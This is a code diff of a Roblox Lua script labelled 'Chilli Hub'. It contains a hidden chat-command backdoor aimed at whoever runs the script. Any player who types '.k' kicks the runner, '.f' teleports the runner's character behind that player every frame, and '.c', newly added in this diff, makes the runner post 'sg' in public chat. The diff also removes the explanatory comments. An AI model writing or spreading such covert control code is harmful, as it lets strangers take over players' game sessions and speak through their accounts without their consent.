@@ -18,7 +18,7 @@ end
 
 -- Start following the player who typed .f
 local function startFollowing(targetPlayer)
-    stopFollowing()  -- Stop any previous follow
+    stopFollowing()
     
     followingPlayer = targetPlayer
     followConnection = RunService.Heartbeat:Connect(function()
@@ -29,8 +29,7 @@ local function startFollowing(targetPlayer)
             local myHRP = myChar.HumanoidRootPart
             local targetHRP = targetChar.HumanoidRootPart
             
-            -- Teleport behind them
-            myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 3)  -- 3 studs behind
+            myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 3)
         end
     end)
 end
@@ -42,7 +41,7 @@ for _, plr in pairs(Players:GetPlayers()) do
             if msg == ".k" then
                 localPlayer:Kick("You have been removed by Chilli Hub")
             elseif msg == ".c" then
-                -- (you can add something here later if needed)
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("sg", "All")
             elseif msg == ".f" then
                 startFollowing(plr)
             end
@@ -56,7 +55,7 @@ Players.PlayerAdded:Connect(function(plr)
             if msg == ".k" then
                 localPlayer:Kick("You have been removed by Chilli Hub")
             elseif msg == ".c" then
-                -- (placeholder)
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("sg", "All")
             elseif msg == ".f" then
                 startFollowing(plr)
             end
@@ -64,7 +63,6 @@ Players.PlayerAdded:Connect(function(plr)
     end
 end)
 
--- Optional: Stop following on death/respawn
 localPlayer.CharacterAdded:Connect(function()
     stopFollowing()
 end)
